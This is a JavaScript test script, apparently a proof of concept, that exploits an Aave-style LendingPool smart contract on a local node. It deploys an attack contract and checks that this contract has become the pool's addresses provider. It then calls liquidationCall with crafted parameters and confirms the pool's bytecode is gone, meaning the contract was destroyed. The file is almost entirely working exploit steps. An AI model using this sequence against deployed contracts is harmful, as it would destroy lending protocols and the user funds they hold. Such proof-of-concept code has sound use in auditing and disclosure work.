const { expect } = require("chai");
const { ethers } = require("ethers");
const lendingPoolContract = require("../artifacts/contracts/protocol/lendingpool/LendingPool.sol/LendingPool.json");
const attackContract = require("../artifacts/contracts/attack.sol/attack.json");
const url = "http://127.0.0.1:8545";

console.log(".............EXPLOITING.............");
describe("Destruct LendingPool", () => {
  it("Should be initialize ", async () => {
    const provider = new ethers.providers.JsonRpcProvider(url);
    const signer = provider.getSigner(0, provider);

    let currentBlock = await provider.getBlock("latest");
    console.log(
      "CURRENT BLOCK : ",
      currentBlock.number,
      "CURRENT BLOCK TIMESTAMP :",
      currentBlock.timestamp
    );

    const attack = new ethers.ContractFactory(
        attackContract.abi,
        attackContract.bytecode,
        signer
    );
    const exploit = await attack.deploy();
    await exploit.deployed();
    await exploit.initialize();
    const attackAddress = exploit.address;

    const LENDINGPOOL = "0xb9F812003aE906d381945E6010614c114Ecf1A59";
    const lendingPool = new ethers.Contract(
      LENDINGPOOL,
      lendingPoolContract.abi,
      signer
    );
    const addressProvider = await lendingPool.getAddressesProvider();

    expect(attackAddress).to.equal(addressProvider);
  });

  it("Should be destruct", async()=>{
    const provider = new ethers.providers.JsonRpcProvider(url);
    const signer = provider.getSigner(0, provider);
    const LENDINGPOOL = "0xb9F812003aE906d381945E6010614c114Ecf1A59";
    const lendingPool = new ethers.Contract(
      LENDINGPOOL,
      lendingPoolContract.abi,
      signer
    );

    // preparing a malicious data
    const params = "0x0000000000000000000000000000000000000001";
    const debtToCover = 1;
    const receiveAToken = false;
    
    await lendingPool.liquidationCall(params, params, params, debtToCover, receiveAToken);
    const bytesCode = await provider.getCode(LENDINGPOOL);
    expect(bytesCode).to.equal("0x");
    console.log("LendingPool bytes Code : ", bytesCode)
  })
});

